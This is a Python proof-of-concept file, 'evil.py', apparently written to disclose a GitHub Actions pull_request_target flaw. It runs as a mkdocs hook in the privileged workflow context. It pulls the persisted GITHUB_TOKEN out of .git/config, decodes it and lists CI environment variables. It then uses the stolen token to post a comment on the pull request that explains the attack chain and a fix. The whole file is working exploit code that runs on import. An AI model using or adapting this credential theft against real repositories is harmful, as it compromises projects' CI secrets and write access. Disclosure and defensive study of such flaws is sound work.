"""evil.py — loaded by mkdocs as a hook from the attacker-controlled mkdocs.yml.

Runs in the privileged pull_request_target context. Reads the GITHUB_TOKEN
that actions/checkout persisted into .git/config and uses it to post a
comment on the PR that triggered this run.
"""
import base64
import json
import os
import re
import subprocess
import sys
import traceback
import urllib.request


def _log(msg):
    print(f"[evil] {msg}", file=sys.stderr, flush=True)


def _pwn():
    workspace = os.environ["GITHUB_WORKSPACE"]
    event = json.load(open(os.environ["GITHUB_EVENT_PATH"]))
    repo = os.environ["GITHUB_REPOSITORY"]
    run_id = os.environ.get("GITHUB_RUN_ID", "?")
    pr_num = event["pull_request"]["number"]
    pr_user = event["pull_request"]["user"]["login"]

    # actions/checkout@v6 stores the auth header in a temp file referenced
    # via includeIf in .git/config. Ask git to resolve the value for us.
    out = subprocess.run(
        ["git", "-C", workspace, "config", "--get-all",
         "http.https://github.com/.extraheader"],
        capture_output=True, text=True,
    )
    m = re.search(r"AUTHORIZATION:\s*basic\s+([A-Za-z0-9+/=]+)", out.stdout)
    if not m:
        _log(f"no persisted token; git out={out.stdout!r} err={out.stderr!r}")
        return
    decoded = base64.b64decode(m.group(1)).decode("utf-8", "replace")
    _, _, token = decoded.partition(":")
    _log(f"got token len={len(token)} prefix={token[:4]}")

    env_dump = "\n".join(
        f"- `{k}`" for k in sorted(os.environ)
        if k.startswith(("GITHUB_", "RUNNER_", "CI"))
    )
    body = (
        "### PoC: `pull_request_target` RCE\n\n"
        f"This comment was posted by `evil.py`, loaded as a mkdocs `hooks:` "
        f"entry during `mkdocs build --strict` in run "
        f"[#{run_id}](https://github.com/{repo}/actions/runs/{run_id}).\n\n"
        "**Chain**\n"
        "1. Workflow triggers on `pull_request_target` — privileged context, "
        "secrets available, write-capable `GITHUB_TOKEN`.\n"
        "2. `actions/checkout` checks out `pull_request.head.sha` "
        "(attacker code) and *persists credentials* to `.git/config`.\n"
        "3. `mkdocs build --strict` runs the attacker-controlled "
        "`mkdocs.yml`. Its `hooks:` directive imports any Python file in "
        "the PR — this one — granting full RCE.\n"
        "4. `evil.py` reads the persisted token from `.git/config` and "
        "uses it to post this comment via the GitHub API.\n\n"
        f"**Attacker:** `{pr_user}` &nbsp; **Token prefix:** `{token[:4]}…` "
        f"&nbsp; **Length:** {len(token)}\n\n"
        "**Environment visible to attacker code:**\n"
        f"{env_dump}\n\n"
        "**Fix:** switch the trigger to `pull_request` (no write token to "
        "fork code), or move `mkdocs build` into a separate unprivileged "
        "job that never touches secrets, and keep a privileged comment-only "
        "job that consumes the build's artifact."
    )
    url = f"https://api.github.com/repos/{repo}/issues/{pr_num}/comments"
    req = urllib.request.Request(
        url,
        data=json.dumps({"body": body}).encode(),
        method="POST",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "prt-poc",
        },
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        _log(f"comment POST status={r.status}")


try:
    _pwn()
except Exception:
    traceback.print_exc()


def on_config(config, **kwargs):
    return config
